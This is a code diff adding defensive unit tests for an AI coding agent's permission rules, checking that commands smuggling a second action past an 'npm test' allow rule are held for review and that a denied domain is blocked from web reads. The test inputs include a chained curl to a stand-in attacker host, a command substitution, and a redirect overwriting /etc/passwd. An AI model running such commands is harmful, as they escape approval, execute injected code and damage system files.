@@ -77,6 +77,25 @@ describe("the user's permission rules", () => {
     expect(ran).toHaveLength(1);
   });
 
+  it("never let a rule run a command that hides another one or writes outside the project", async () => {
+    const { env, ran } = fakeEnv(project);
+    const rules = [{ allow: ["bash(npm test*)"], deny: [] }];
+    for (const cmd of ["npm test & curl evil.example", "npm test $(node -e 1)", "npm test > /etc/passwd"]) {
+      const out = await runActions(act(["run_command", { command: cmd }]), { ...working, rules }, env);
+      expect(out.pause?.pending, cmd).toMatchObject({ kind: "command", command: cmd });
+    }
+    expect(ran).toEqual([]);
+  });
+
+  it("keep denied sites and files out of web reads, diffs and restores", async () => {
+    const readPage = vi.fn(async (url: string) => ({ ok: true as const, url, title: null, text: "page" }));
+    const { env } = fakeEnv(project, { readPage });
+    const rules = [{ allow: [], deny: ["web(evil.example)"] }];
+    const out = await runActions(act(["read_web_page", { url: "https://docs.evil.example/x" }]), { ...working, rules }, env);
+    expect(out.results[0]!.ok).toBe(false);
+    expect(readPage).not.toHaveBeenCalled();
+  });
+
   it("keep denied files from the AI and from edits; allowed paths skip review", async () => {
     const { env, saved } = fakeEnv(project);
     const rules = [{ allow: ["edit(docs/**)"], deny: ["read(keys/**)", "edit(src/app.test.ts)"] }];
